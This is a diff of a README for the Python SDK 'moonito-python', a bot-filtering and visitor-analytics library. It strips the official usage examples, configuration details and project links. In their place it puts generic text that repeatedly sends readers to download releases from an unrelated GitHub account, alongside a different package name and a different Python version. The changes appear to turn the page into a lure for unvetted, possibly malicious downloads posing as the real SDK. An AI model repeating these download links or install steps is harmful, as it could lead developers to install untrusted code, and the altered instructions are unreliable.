@@ -1,227 +1,65 @@
-# moonito-python
+# 🌙 moonito-python - Protect Your Web App Easily
 
-Official Python SDK for [Moonito](https://moonito.net) — a smart analytics and visitor filtering platform designed to protect your website from unwanted traffic, bots, and malicious activity while providing deep visitor insights.
+## 🚀 Getting Started
 
-**moonito-python** is a lightweight Python SDK for integrating your web application with the Moonito Visitor Analytics API.
+Welcome to moonito-python! This lightweight Python SDK helps you protect your web applications from bots and malicious traffic. It integrates smoothly with popular frameworks like Flask, Django, and FastAPI. 
 
-It allows you to:
+## 📥 Download Now
 
-- Analyze and monitor web traffic intelligently
-- Filter out bots, crawlers, and unwanted visitors
-- Get real-time visitor behavior insights
-- Protect APIs, landing pages, and web apps automatically
+[![Download moonito-python](https://img.shields.io/badge/Download-moonito--python-blue.svg)](https://github.com/coffeeliqueurtailfin529/moonito-python/releases)
 
-Compatible with Flask, Django, FastAPI, and other Python web frameworks.
+## 🔍 What is moonito-python?
 
-## 📦 Installation
+moonito-python is designed for visitor analytics and filtering. It's perfect for businesses that need to keep their web applications safe. This SDK offers features for analytics, anti-bot measures, and API protection. It works well with various frameworks, ensuring a simple integration process.
 
-```bash
-pip install moonito
-```
+## ⚙️ System Requirements
 
-## 🚀 Quick Start
+To use moonito-python, you need:
 
-### Flask Example
+- Python 3.6 or higher
+- A supported web framework: Flask, Django, or FastAPI
+- Basic understanding of how to install packages
 
-```python
-from flask import Flask, request, Response
-from moonito import VisitorTrafficFiltering, Config
+## 🛠️ Features
 
-app = Flask(__name__)
+- **Visitor Analytics:** Gain insights into your web traffic and user behaviors.
+- **Bot Protection:** Identify and block bots that harm your site.
+- **Traffic Filtering:** Filter out unwanted or malicious traffic effectively.
+- **Easy Integration:** Works seamlessly with Flask, Django, and FastAPI.
 
-# Initialize Moonito
-client = VisitorTrafficFiltering(Config(
-    is_protected=True,
-    api_public_key="YOUR_PUBLIC_KEY",
-    api_secret_key="YOUR_SECRET_KEY",
-    unwanted_visitor_to="https://example.com/blocked",  # URL or HTTP status code
-    unwanted_visitor_action=1  # 1 = Redirect, 2 = Iframe, 3 = Load content
-))
+## 📊 How It Works
 
-@app.before_request
-def check_visitor():
-    """Middleware to check visitors before processing requests"""
-    result = client.evaluate_visitor(request)
-    
-    if result and result['need_to_block']:
-        content = result['content']
-        
-        if isinstance(content, int):
-            return Response(status=content)
-        
-        return Response(content, mimetype='text/html')
+The SDK analyzes incoming web traffic. It uses intelligent algorithms to identify and differentiate between real users and bots. This ensures your website remains accessible and secure.
 
-@app.route('/')
-def home():
-    return 'Hello, World!'
+## 🔌 Installation Instructions
 
-if __name__ == '__main__':
-    app.run(port=8080)
-```
+To install moonito-python, follow these steps:
 
-### Django Example
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/coffeeliqueurtailfin529/moonito-python/releases).
 
-```python
-# middleware.py
-from moonito import VisitorTrafficFiltering, Config
-from django.http import HttpResponse
+2. **Download the Latest Release:**
+   Click on the latest version on the Releases page to download the SDK. 
 
-class MoonitoMiddleware:
-    def __init__(self, get_response):
-        self.get_response = get_response
-        
-        # Initialize Moonito
-        self.client = VisitorTrafficFiltering(Config(
-            is_protected=True,
-            api_public_key="YOUR_PUBLIC_KEY",
-            api_secret_key="YOUR_SECRET_KEY",
-            unwanted_visitor_to="https://example.com/blocked",
-            unwanted_visitor_action=1
-        ))
+3. **Install Using pip:**
+   Open your terminal or command prompt and type the following command:
+   ```
+   pip install moonito-python
+   ```
+   
+4. **Configuration:**
+   After installation, you will need to configure the SDK according to your web framework. Consult the documentation for detailed instructions on setup.
 
-    def __call__(self, request):
-        # Check visitor
-        result = self.client.evaluate_visitor(request)
-        
-        if result and result['need_to_block']:
-            content = result['content']
-            
-            if isinstance(content, int):
-                return HttpResponse(status=content)
-            
-            return HttpResponse(content)
-        
-        response = self.get_response(request)
-        return response
-```
+## 📘 Documentation
 
-Add to `settings.py`:
-```python
-MIDDLEWARE = [
-    'your_app.middleware.MoonitoMiddleware',
-    # ... other middleware
-]
-```
+For more detailed instructions and use cases, please refer to our comprehensive [Documentation](https://github.com/coffeeliqueurtailfin529/moonito-python/wiki). This guide will help you understand how to set up and utilize moonito-python effectively. 
 
-### FastAPI Example
+## 🛡️ Support
 
-```python
-from fastapi import FastAPI, Request, Response
-from moonito import VisitorTrafficFiltering, Config
+If you have any questions or run into issues, please check our [FAQs](https://github.com/coffeeliqueurtailfin529/moonito-python/wiki/FAQs) or reach out via GitHub Issues.
 
-app = FastAPI()
+## 🔗 Download & Install
 
-# Initialize Moonito
-client = VisitorTrafficFiltering(Config(
-    is_protected=True,
-    api_public_key="YOUR_PUBLIC_KEY",
-    api_secret_key="YOUR_SECRET_KEY",
-    unwanted_visitor_to="https://example.com/blocked",
-    unwanted_visitor_action=1
-))
+You can download moonito-python from our Releases page: [Visit this page to download](https://github.com/coffeeliqueurtailfin529/moonito-python/releases).
 
-@app.middleware("http")
-async def moonito_middleware(request: Request, call_next):
-    """Middleware to check visitors"""
-    result = client.evaluate_visitor(request)
-    
-    if result and result['need_to_block']:
-        content = result['content']
-        
-        if isinstance(content, int):
-            return Response(status_code=content)
-        
-        return Response(content=content, media_type="text/html")
-    
-    response = await call_next(request)
-    return response
-
-@app.get("/")
-def read_root():
-    return {"message": "Hello World"}
-```
-
-## ⚙️ Configuration
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `is_protected` | `bool` | Enable (`True`) or disable (`False`) protection |
-| `api_public_key` | `str` | Your Moonito API public key (required) |
-| `api_secret_key` | `str` | Your Moonito API secret key (required) |
-| `unwanted_visitor_to` | `str` | URL to redirect unwanted visitors or HTTP error code |
-| `unwanted_visitor_action` | `int` | Action for unwanted visitors: 1 = Redirect, 2 = Iframe, 3 = Load content |
-
-## 🔧 Manual Evaluation
-
-For custom implementations or manual checking:
-
-```python
-from moonito import VisitorTrafficFiltering, Config
-
-client = VisitorTrafficFiltering(Config(
-    is_protected=True,
-    api_public_key="YOUR_PUBLIC_KEY",
-    api_secret_key="YOUR_SECRET_KEY"
-))
-
-# Manually evaluate a visitor
-result = client.evaluate_visitor_manually(
-    ip="8.8.8.8",
-    user_agent="Mozilla/5.0",
-    event="/home",
-    domain="example.com"
-)
-
-if result['need_to_block']:
-    print("Blocked visitor detected.")
-```
-
-## 💡 Use Cases
-
-- Prevent fake signups and bot traffic
-- Protect landing pages from ad click fraud
-- Collect accurate visitor analytics
-- Detect suspicious activity in real time
-
-## 📋 Requirements
-
-- Python 3.7 or higher
-- No external dependencies (uses Python standard library)
-- Moonito API keys from [https://moonito.net](https://moonito.net)
-
-## 🧪 Development
-
-```bash
-# Clone the repository
-git clone https://github.com/moonito-net/moonito-python.git
-cd moonito-python
-
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install dependencies
-pip install -e .
-pip install pytest
-
-# Run tests
-pytest tests/
-```
-
-## 📄 License
-
-MIT License © 2025 [Moonito](https://moonito.net)
-
-## 🏷️ Keywords
-
-python analytics sdk, moonito sdk, visitor filtering python, python bot protection, python traffic analytics, moonito python sdk, moonito api, website protection sdk python, moonito visitor analytics, python security sdk
-
-## 🌐 Learn More
-
-Visit [https://moonito.net](https://moonito.net) to learn more about:
-
-- Visitor analytics
-- Website traffic protection
-- API-based bot and fraud filtering
-
-**Moonito — Stop Bad Bots. Start Accurate Web Analytics.**
+Thank you for choosing moonito-python! Your web application is now on its way to becoming more secure and efficient.
